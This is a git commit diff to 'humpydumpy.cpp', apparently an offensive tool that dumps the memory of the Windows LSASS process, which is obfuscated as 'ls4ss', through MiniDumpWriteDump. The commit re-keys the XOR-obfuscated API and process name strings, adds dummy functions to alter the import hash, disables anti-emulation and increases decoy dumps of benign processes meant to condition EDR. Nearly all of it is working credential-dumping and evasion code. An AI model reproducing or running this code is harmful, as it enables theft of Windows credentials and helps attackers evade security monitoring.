0455ec0291db45fe193141f974f55b44807e6b86
Dobin Rutishauser <dobin.rutishauser@gmail.com>
2025-12-16 09:08:41 +0100

    version 4

--- humpydumpy/humpydumpy.cpp
+++ humpydumpy/humpydumpy.cpp
@@ -10,6 +10,29 @@
 #pragma comment(lib, "dbghelp.lib")
 
 
+// Change IMPhash?
+
+void bla1() {
+    MessageBoxA(NULL, "Hello", "World", MB_OK);
+}
+
+void bla2() {
+    HINSTANCE hInstance = NULL;
+    HWND hwnd = CreateWindowEx(
+        0,                      // Extended window style (none)
+        L"asdf",             // Window class name
+        L"Minimal Windows App",  // Window title
+        WS_OVERLAPPEDWINDOW,    // Window style (standard)
+        CW_USEDEFAULT, CW_USEDEFAULT, // Position (default)
+        500, 300,               // Size (width, height)
+        NULL,                   // Parent window (none)
+        NULL,                   // Menu (none)
+        hInstance,              // Instance handle
+        NULL                    // Additional application data
+    );
+}
+
+
 // Anti Emulation
 
 // https://github.com/dobin/SuperMega/blob/main/data/source/antiemulation/timeraw.c
@@ -47,15 +70,15 @@ typedef BOOL(WINAPI* MyDumpPtr)(
 MyDumpPtr MiniDWriteD = NULL;
 
 bool resolve_func() {
-    // dbghelp.dll
+    // dbghelp.dll\0
     // https://cyberchef.org/#recipe=Unescape_string()XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=ZGJnaGVscC5kbGw
-    BYTE dumpLibraryBytes[] = { 0x25,0x20,0x26,0x2a,0x24,0x2e,0x31,0x6c,0x25,0x2e,0x2d,0x42 };
-    for (size_t i = 0; i < sizeof(dumpLibraryBytes); ++i) { dumpLibraryBytes[i] ^= ((i & 1) == 0 ? 0x41 : 0x42); }
+    BYTE dumpLibraryBytes[] = { 0x25,0x21,0x26,0x2b,0x24,0x2f,0x31,0x6d,0x25,0x2f,0x2d,0x43 };
+    for (size_t i = 0; i < sizeof(dumpLibraryBytes); ++i) { dumpLibraryBytes[i] ^= ((i & 1) == 0 ? 0x41 : 0x43); }
 
 	// MiniDumpWriteDump\0
     // https://cyberchef.org/#recipe=Unescape_string()XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=TWluaUR1bXBXcml0ZUR1bXBcMA
-    BYTE dumpFunctionBytes[] = { 0x0c,0x2b,0x2f,0x2b,0x05,0x37,0x2c,0x32,0x16,0x30,0x28,0x36,0x24,0x06,0x34,0x2f,0x31,0x42 };
-    for (size_t i = 0; i < sizeof(dumpFunctionBytes); ++i) { dumpFunctionBytes[i] ^= ((i & 1) == 0 ? 0x41 : 0x42); }
+    BYTE dumpFunctionBytes[] = { 0x0c,0x2a,0x2f,0x2a,0x05,0x36,0x2c,0x33,0x16,0x31,0x28,0x37,0x24,0x07,0x34,0x2e,0x31,0x43 };
+    for (size_t i = 0; i < sizeof(dumpFunctionBytes); ++i) { dumpFunctionBytes[i] ^= ((i & 1) == 0 ? 0x41 : 0x43); }
 
     char* dumpLibrary = reinterpret_cast<char*>(dumpLibraryBytes);
     char* dumpFunction = reinterpret_cast<char*>(dumpFunctionBytes);
@@ -109,7 +132,7 @@ bool dump_process(DWORD pid) {
 void deconditioning(unsigned int deconDumps) {
     std::vector<std::wstring> procsDump = {
         //L"ctfmon.exe", L"explorer.exe", L"ShellHost.exe", L"audiodg.exe"
-        L"notepad.exe", L"cmd.exe", L"StartMenuExperienceHost.exe"
+        L"conhost.exe", L"cmd.exe", L"StartMenuExperienceHost.exe", L"ctfmon.exe"
     };
 
     for(int i=0; i<deconDumps; i++) {
@@ -123,8 +146,8 @@ void deconditioning(unsigned int deconDumps) {
 void dump_ls4ss() {
     // ls4ss.exe
     // https://cyberchef.org/#recipe=Unescape_string()Encode_text('UTF-16LE%20(1200)')XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=bHNhc3MuZXhlXDA
-    BYTE procBytes[] = { 0x2d,0x42,0x32,0x42,0x20,0x42,0x32,0x42,0x32,0x42,0x6f,0x42,0x24,0x42,0x39,0x42,0x24,0x42,0x41,0x42 };
-    for (size_t i = 0; i < sizeof(procBytes); ++i) { procBytes[i] ^= ((i & 1) == 0 ? 0x41 : 0x42); }
+    BYTE procBytes[] = { 0x2d,0x43,0x32,0x43,0x20,0x43,0x32,0x43,0x32,0x43,0x6f,0x43,0x24,0x43,0x39,0x43,0x24,0x43,0x41,0x43 };
+    for (size_t i = 0; i < sizeof(procBytes); ++i) { procBytes[i] ^= ((i & 1) == 0 ? 0x41 : 0x43); }
     wchar_t* procW = reinterpret_cast<wchar_t*>(procBytes);
 
     DWORD lsa4sPid = ProcessCache::GetPid(procW);
@@ -144,16 +167,21 @@ void dump_ls4ss() {
 
 
 int main(int argc, char* argv[]) {
-    std::cout << "Start\n";
-    antiemulation();
+    std::cout << "1 Start\n";
+    
+    //antiemulation();
+
+    std::cout << "2 Resolve\n";
 
     if (! resolve_func()) {
         std::cerr << "Failed to resolve functions\n";
         return 1;
 	}
 
-    deconditioning(10);
-    
+    std::cout << "3 Decon\n";
+
+    deconditioning(20);
+
     if (argc > 1 && argv[1][0] == '1') {
 		std::cout << "Dumping ls4ss\n";
         dump_ls4ss();
